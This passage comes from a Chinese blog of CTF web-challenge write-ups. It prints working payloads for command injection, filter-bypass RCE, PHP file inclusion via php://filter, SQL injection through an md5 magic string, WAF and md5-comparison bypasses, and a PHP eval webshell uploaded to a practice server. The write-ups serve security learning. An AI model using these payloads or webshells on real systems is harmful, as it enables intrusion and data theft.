<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line"></span><br><span class="line">  public $file = &quot;flag.php&quot;;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$password = new Flag();</span><br><span class="line"></span><br><span class="line">echo serialize($password);</span><br><span class="line"></span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></div></figure>

<p>得到序列化</p>
<p><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>  </p>
<p>最终payload</p>
<p><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111623764.png" alt="image-20240111162302692"></p>
<p>得到flag</p>

        <h1 id="二十五、-BJDCTF-2020-easy-md5"   >
          <a href="#二十五、-BJDCTF-2020-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十五、-BJDCTF-2020-easy-md5" class="headerlink" title="二十五、[BJDCTF 2020]easy_md5"></a>二十五、[BJDCTF 2020]easy_md5</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111634746.png" alt="image-20240111163441663"></p>
<p>此题在BUU做过，但是这里没有告知源码</p>
<p>抓包一下，看到有个hint</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111635909.png" alt="image-20240111163530854"></p>
<p>意思是说md5($pass,true)的值恒为真，即md5加密后的变量pass恒为真，后面的true是把结果返回成16位原始二进制格式的字符串</p>
<p>要使md5($pass,true)的值恒为真，则结果应该是类似于’ ‘or’1‘的格式（or后面的字符不为0即可）</p>
<p>上网查了一下</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/tzf1/p/14980531.html" >https://www.cnblogs.com/tzf1/p/14980531.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ffifdyop的md5值为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401211315075.png" alt="image-20240121131515928"></p>
<p>满足恒为真的条件</p>
<p>但其实引号也不是很满足，后来查了源码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401211317033.png" alt="image-20240121131707957"></p>
<p>原来本身前面就有一个单引号闭合（其中的“.”是加上的意思）</p>
<p>输入ffifdyop</p>
<p>之后便按之前的方法，数组绕过</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111640690.png" alt="image-20240111164012624"></p>
<p>得到flag</p>

        <h1 id="二十六、-LitCTF-2023-导弹迷踪"   >
          <a href="#二十六、-LitCTF-2023-导弹迷踪" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十六、-LitCTF-2023-导弹迷踪" class="headerlink" title="二十六、[LitCTF 2023]导弹迷踪"></a>二十六、[LitCTF 2023]导弹迷踪</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427123.png"></p>
<p>一个游戏界面，看看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427237.png" alt="image-20240112142742145"></p>
<p>后面一堆.js文件</p>
<p>这是一个游戏，所以在game.js文件里肯定能找到通关条件之类的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121428674.png" alt="image-20240112142825600"></p>
<p>直接得到flag</p>

        <h1 id="二十七、-SWPUCTF-2021-新生赛-hardrce"   >
          <a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="二十七、[SWPUCTF 2021 新生赛]hardrce"></a>二十七、[SWPUCTF 2021 新生赛]hardrce</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121431101.png" alt="image-20240112143102034"></p>
<p>是RCE题，但是过滤了很多字符，字母也过滤了</p>
<p>上网查了一下，可以使用取反绕过</p>

        <h6 id="url编码取反绕过-：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过"   >
          <a href="#url编码取反绕过-：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#url编码取反绕过-：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过" class="headerlink" title="url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过"></a><em>url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过</em></h6>
      <p>对查询根目录下的文件语句取反，在shell里分别构造</p>
<p><code>php -r &quot;echo urlencode(~&#39;system&#39;);&quot;</code></p>
<p><code>php -r &quot;echo urlencode(~&#39;ls /&#39;);&quot;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121451932.png" alt="image-20240112145159869"></p>
<p>于是构造payload（取反这部分要单独用括号括起来）</p>
<p><code>/?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121453975.png" alt="image-20240112145303871"></p>
<p>有了/flllllaaaaaaggggggg文件</p>
<p>取反打开文件命令</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121454102.png" alt="image-20240112145425048"></p>
<p>构造最终payload</p>
<p><code>/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121454294.png" alt="image-20240112145452208"></p>
<p>得到flag</p>

        <h5 id="思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html"   >
          <a href="#思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html" class="headerlink" title="思路来源：https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html"></a>思路来源：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html" >https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h5>
      
        <h1 id="二十八、-NSSCTF-2022-Spring-Recruit-ezgame"   >
          <a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="二十八、[NSSCTF 2022 Spring Recruit]ezgame"></a>二十八、[NSSCTF 2022 Spring Recruit]ezgame</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121720198.png" alt="image-20240112172024966"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121722265.png" alt="image-20240112172220181"></p>
<p>看一下.js文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121723492.png" alt="image-20240112172314425"></p>
<p>发现flag就在里面</p>

        <h1 id="二十九、-GXYCTF-2019-Ping-Ping-Ping"   >
          <a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="二十九、[GXYCTF 2019]Ping Ping Ping"></a>二十九、[GXYCTF 2019]Ping Ping Ping</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121741716.png" alt="image-20240112174121627"></p>
<p>先尝试输入ping命令</p>
<p><code>;ls</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121742764.png" alt="image-20240112174203700"></p>
<p>有flag.php文件，打开看看</p>
<p><code>;cat flag.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121743163.png" alt="image-20240112174320099"></p>
<p>空格被过滤了，绕过</p>
<p><code>;cat$IFS$1flag.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121744102.png" alt="image-20240112174412039"></p>
<p>flag也被过滤了</p>
<p>可以按[GXYCTF2019]Ping Ping Ping 1的方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121744842.png" alt="image-20240112174455780"></p>
<p>最终得到flag</p>

        <h6 id="（PS-用内联执行还能看到过滤了哪些内容）"   >
          <a href="#（PS-用内联执行还能看到过滤了哪些内容）" class="heading-link"><i class="fas fa-link"></i></a><a href="#（PS-用内联执行还能看到过滤了哪些内容）" class="headerlink" title="（PS:用内联执行还能看到过滤了哪些内容）"></a>（PS:用内联执行还能看到过滤了哪些内容）</h6>
      
        <h1 id="三十、-LitCTF-2023-Follow-me-and-hack-me"   >
          <a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="三十、[LitCTF 2023]Follow me and hack me"></a>三十、[LitCTF 2023]Follow me and hack me</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151428577.png" alt="image-20240115142835407"></p>
<p>按它的要求，用HackBar</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432753.png" alt="image-20240115143217668"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432296.png" alt="image-20240115143234241"></p>
<p>得到flag</p>
<p>(瞅瞅备份文件</p>
<p>/<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151445090.png" alt="image-20240115144501973"></p>
<p>)</p>

        <h1 id="三十一、-LitCTF-2023-Ping"   >
          <a href="#三十一、-LitCTF-2023-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十一、-LitCTF-2023-Ping" class="headerlink" title="三十一、[LitCTF 2023]Ping"></a>三十一、[LitCTF 2023]Ping</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151519504.png" alt="image-20240115151942409"></p>
<p>在框内输入127.0.0.1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151520062.png" alt="image-20240115152034970"></p>
<p>再试试一些命令，比如</p>
<p><code>;ls</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151521725.png" alt="image-20240115152108193"></p>
<p>看来不行，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151521798.png" alt="image-20240115152143728">定义了一个用于匹配 IP 地址的正则表达式。这个正则表达式包括四个部分，每个部分对应 IP 地址中的一个数字，这些部分由点号 (.) 分隔。每个部分可以匹配从 0 到 255 的数字</p>

        <h3 id="法Ⅰ：POST传参"   >
          <a href="#法Ⅰ：POST传参" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：POST传参" class="headerlink" title="法Ⅰ：POST传参"></a>法Ⅰ：POST传参</h3>
      <p>然后发现下面有说用POST方法传入command参数，再尝试用HackBar传入一下命令（一般是flag文件，完整步骤应该是先用命令<code>;ls /</code>查看根目录下所有文件）</p>
<p><code>command=;cat /flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151524854.png" alt="image-20240115152402784"></p>
<p>EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151524475.png" alt="image-20240115152420415"></p>
<p>直接就有了</p>

        <h3 id="法Ⅱ：关闭JavaScript"   >
          <a href="#法Ⅱ：关闭JavaScript" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：关闭JavaScript" class="headerlink" title="法Ⅱ：关闭JavaScript"></a>法Ⅱ：关闭JavaScript</h3>
      <p>是前端验证</p>
<p>在浏览器的设置里关掉网页的JavaScript，再在框内输入命令</p>
<p><code>;cat /flag</code></p>
<p>也能直接出</p>

        <h1 id="三十二、-SWPUCTF-2021-新生赛-finalrce"   >
          <a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="三十二、[SWPUCTF 2021 新生赛]finalrce"></a>三十二、[SWPUCTF 2021 新生赛]finalrce</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151544848.png" alt="image-20240115154437783"></p>
<p>过滤了一堆命令和字符，再用取反试试(ls /)</p>
<p><code>/?url=(~%93%8C%DF%D0);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151627219.png" alt="image-20240115162758142"></p>
<p>抓包同样啥也没看见</p>

        <h6 id="用tee命令：Linux-tee命令用于读取标准输入的数据，并将其内容输出成文件。"   >
          <a href="#用tee命令：Linux-tee命令用于读取标准输入的数据，并将其内容输出成文件。" class="heading-link"><i class="fas fa-link"></i></a><a href="#用tee命令：Linux-tee命令用于读取标准输入的数据，并将其内容输出成文件。" class="headerlink" title="用tee命令：Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。"></a><em>用tee命令：Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</em></h6>
      
        <h6 id="基本结构为：command-tee-file-txt"   >
          <a href="#基本结构为：command-tee-file-txt" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本结构为：command-tee-file-txt" class="headerlink" title="基本结构为：command | tee file.txt"></a><em>基本结构为：<code>command | tee file.txt</code></em></h6>
      
        <h6 id="因为题目没过滤-这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入"   >
          <a href="#因为题目没过滤-这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入" class="heading-link"><i class="fas fa-link"></i></a><a href="#因为题目没过滤-这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入" class="headerlink" title="因为题目没过滤 | , 这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入"></a><em>因为题目没过滤 | , 这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入</em></h6>
      
        <h6 id="那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file-txt里"   >
          <a href="#那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file-txt里" class="heading-link"><i class="fas fa-link"></i></a><a href="#那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file-txt里" class="headerlink" title="那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file.txt里"></a><em>那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file.txt里</em></h6>
      <p>但是用取反绕过ls访问文件无法访问，只能换一种方式绕过</p>

        <h6 id="转义字符-是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）"   >
          <a href="#转义字符-是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）" class="heading-link"><i class="fas fa-link"></i></a><a href="#转义字符-是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）" class="headerlink" title="转义字符 \ 是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）"></a><em>转义字符 \ 是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）</em></h6>
      <p>构造payload：</p>
<p><code>/?url=l\s / |tee 1.txt</code></p>
<p>访问/1.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151635643.png" alt="image-20240115163504578"></p>
<p>打开这个文件，但是cat被过滤了</p>

        <h6 id="tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式"   >
          <a href="#tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式" class="headerlink" title="tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式"></a><em>tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式</em></h6>
      <p>构造最终payload（la也被过滤了）：</p>
<p><code>/?url=tac /flllll\aaaaaaggggggg |tee 2.txt</code></p>
<p>再访问/2.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151639166.png" alt="image-20240115163941098"></p>
<p>得到flag</p>

        <h1 id="三十三、-SWPUCTF-2022-新生赛-ez-ez-php"   >
          <a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="三十三、[SWPUCTF 2022 新生赛]ez_ez_php"></a>三十三、[SWPUCTF 2022 新生赛]ez_ez_php</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221211835.png" alt="image-20240122121130778"></p>
<p>阅读代码可知是要传入<code>file</code>参数，<code>if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; ... &#125;</code>是检查 <code>file</code> 参数的前三个字符是否是 “php”。如果是，执行大括号内的代码，否则执行 <code>else</code> 语句，末尾又提醒我们flag可能在flag.php文件内</p>
<p>根据代码是要我们使用php伪协议并且是要用<code>php://filter</code>这种类型的</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221222878.png" alt="image-20240122122235788"></p>
<p>到CyberChef解读一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223417.png" alt="image-20240122122355335"></p>
<p>看来不对，但是又提示说真的flag在’flag’内，于是构造最终payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221208966.png" alt="image-20240122120816881"></p>
<p>到CyberChef解读一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223698.png" alt="image-20240122122322631"></p>
<p>获得flag</p>

        <h1 id="三十四、-LitCTF-2023-作业管理系统"   >
          <a href="#三十四、-LitCTF-2023-作业管理系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十四、-LitCTF-2023-作业管理系统" class="headerlink" title="三十四、[LitCTF 2023]作业管理系统"></a>三十四、[LitCTF 2023]作业管理系统</h1>
      <p>打开之后是一个登陆界面，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557477.png" alt="image-20240122155704390"></p>
<p>登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557311.png" alt="image-20240122155736099"></p>
<p>看到有上传文件，猜测是文件上传漏洞，上传写有一句话木马的文件test.php</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd]);  ?&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221558932.png" alt="image-20240122155838831"></p>
<p>上传成功，用蚁剑连接试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221600535.png" alt="image-20240122160003405"></p>
<p>查找文件的根目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221555294.png" alt="image-20240122155547178"></p>
<p>获得flag</p>

        <h1 id="三十五、-鹏城杯-2022-简单包含"   >
          <a href="#三十五、-鹏城杯-2022-简单包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十五、-鹏城杯-2022-简单包含" class="headerlink" title="三十五、[鹏城杯 2022]简单包含"></a>三十五、[鹏城杯 2022]简单包含</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221602742.png" alt="image-20240122160213679"></p>
<p>要使用POST方法传参flag，flag在/var/www/html/flag.php中</p>
<p>包含题可以尝试php伪协议，使用HackBar给flag传入参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></div></figure>

<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221609276.png" alt="image-20240122160936215"></p>
<p>有回显，但是显示waf，查了一下是Web应用防护系统，那就说明是有什么过滤的，访问一下源码index.php</p>
<p>使用HackBar给flag传入参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></div></figure>

<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221614172.png" alt="image-20240122161430069"></p>
<p>用CyberChef解读</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221615921.png" alt="image-20240122161545859"></p>
<p>代码首先检查通过 <code>php://input</code> 流读取的 POST 数据的长度是否小于 800 字节。接着，它使用 <code>preg_match</code> 函数检查变量 <code>$path</code> 中是否包含字符串 “flag”，若两个条件都满足，脚本输出 ‘nssctf waf!’，所以只要传入的参数长度大于800字节就可以绕过</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></div></figure>

<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630996.png" alt="image-20240122163013873"></p>
<p>解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221630694.png" alt="image-20240122163033643"></p>
<p>得到flag</p>

        <h1 id="三十六、-UUCTF-2022-新生赛-websign"   >
          <a href="#三十六、-UUCTF-2022-新生赛-websign" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十六、-UUCTF-2022-新生赛-websign" class="headerlink" title="三十六、[UUCTF 2022 新生赛]websign"></a>三十六、[UUCTF 2022 新生赛]websign</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221633382.png" alt="image-20240122163337319"></p>
<p>那我们就查看源代码，但是鼠标右键和F12都没反应，看来是被禁用了，那直接在URL前面加上</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221635386.png" alt="image-20240122163526317"></p>
<p>得到flag</p>

        <h1 id="三十七、-HDCTF-2023-Welcome-To-HDCTF-2023"   >
          <a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十七、-HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="三十七、[HDCTF 2023]Welcome To HDCTF 2023"></a>三十七、[HDCTF 2023]Welcome To HDCTF 2023</h1>
      <p>是一个游戏，死了之后直接弹出弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221643437.png" alt="image-20240122164322298"></p>
<p>提交了发现还真是flag（好突然的）</p>

        <h1 id="三十八、-NSSCTF-2022-Spring-Recruit-babyphp"   >
          <a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十八、-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="三十八、[NSSCTF 2022 Spring Recruit]babyphp"></a>三十八、[NSSCTF 2022 Spring Recruit]babyphp</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221653532.png" alt="image-20240122165356442"></p>
<p>阅读代码可知，要想获得flag，检查 POST 数据中的 <code>a</code> 字段，要求其不含数字且 <code>intval</code> 后的结果为真；检查 <code>b1</code> 和 <code>b2</code> 字段存在，并且它们不相等，但它们的md5值相等；检查 <code>c1</code> 和 <code>c2</code> 字段不相等，都是字符串类型，且它们的md5值相等</p>

        <h6 id="intval-函数可以获取变量的整数值，常用于强制类型转换"   >
          <a href="#intval-函数可以获取变量的整数值，常用于强制类型转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#intval-函数可以获取变量的整数值，常用于强制类型转换" class="headerlink" title="intval() 函数可以获取变量的整数值，常用于强制类型转换"></a>intval() 函数可以获取变量的整数值，常用于强制类型转换</h6>
      <p>对于<code>a</code>，这里对<code>a</code>过滤了数字，只能用数组来绕过，因为intval() 函数转换数组类型时，不关心数组中的内容，只判断数组中有没有元素</p>
<p>对于<code>b1</code>和<code>b2</code>，则可以用数组绕过</p>
<p>对于<code>c1</code>和<code>c2</code>，由于这里多了判断是否是字符串，所以不能用数组绕过，只能改用科学计数法绕过，所以传入两个md5加密后结果是0e开头的字符串</p>
<p>所以最终传入：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b1[]=2&amp;b2[]=3&amp;c1=QNKCDZO&amp;c2=s878926199a</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231738376.png" alt="image-20240123173817286"></p>
<p>EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231741793.png" alt="image-20240123174130710"></p>
<p>得到flag</p>

        <h1 id="三十九、-GDOUCTF-2023-EZ-WEB"   >
          <a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十九、-GDOUCTF-2023-EZ-WEB" class="headerlink" title="三十九、[GDOUCTF 2023]EZ WEB"></a>三十九、[GDOUCTF 2023]EZ WEB</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905361.png" alt="image-20240123190517274"></p>
<p>点击</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231905885.png" alt="image-20240123190537804"></p>
<p>查看源代码，发现有/src提示，访问/src</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231904983.png" alt="image-20240123190459779"></p>
<p>这段 Python 代码使用 Flask 框架创建了一个简单的 web 应用程序。它定义了三个路由处理函数：</p>
